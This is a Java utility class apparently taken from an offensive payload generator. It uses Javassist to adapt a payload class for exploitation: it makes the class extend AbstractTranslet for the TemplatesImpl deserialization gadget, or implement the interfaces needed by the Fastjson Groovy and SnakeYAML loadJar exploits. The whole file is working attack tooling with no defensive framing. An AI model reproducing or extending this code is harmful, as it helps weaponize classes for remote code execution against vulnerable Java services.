package jmg.core.util;

import javassist.ClassPool;
import javassist.CtClass;
import jmg.core.config.AbstractConfig;
import jmg.core.config.Constants;

/**
 * 专项漏洞的处理
 */
public class CtClassUtil {
    private AbstractConfig config;
    private ClassPool pool;
    private CtClass ctClass;

    public CtClassUtil(AbstractConfig config, ClassPool pool, CtClass ctClass) {
        this.config = config;
        this.pool = pool;
        this.ctClass = ctClass;
    }


    public byte[] modifyForExploitation() throws Exception {
        if (config.getGadgetType() != null) {
            if (config.getGadgetType().equals(Constants.GADGET_JDK_TRANSLET)) {
                applyJDKAbstractTranslet();
            }
            if (config.getGadgetType().equals(Constants.GADGET_XALAN_TRANSLET)) {
                applyXALANAbstractTranslet();
            }

            if (config.getGadgetType().equals(Constants.GADGET_FJ_GROOVY)) {
                applyFastjsonGroovyASTTransformation();
            }
            if (config.getGadgetType().equals(Constants.GADGET_SNAKEYAML)) {
                applySnakeYamlScriptEngineFactory();
            }
        }
        return ctClass.toBytecode();
    }


    public void applyJDKAbstractTranslet() throws Exception {
        JavassistUtil.extendClass(ctClass, "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
    }

    public void applyXALANAbstractTranslet() {
        try {
            JavassistUtil.extendClass(ctClass, "org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    // Fastjson Groovy loadJar 的利用需要实现 ASTTransformation 接口
    public void applyFastjsonGroovyASTTransformation() throws Exception {
        config.setImplementsASTTransformationType(true);
        JavassistUtil.implementInterface(ctClass,"org.codehaus.groovy.transform.ASTTransformation");
        JavassistUtil.addAnnotation(ctClass, "org.codehaus.groovy.transform.GroovyASTTransformation");
    }

    // snakeyaml loadJar 的利用需要实现 ScriptEngineFactory 接口
    public void applySnakeYamlScriptEngineFactory() throws Exception {
        config.setImplementsScriptEngineFactory(true);
        JavassistUtil.implementInterface(ctClass, "javax.script.ScriptEngineFactory");
    }
}
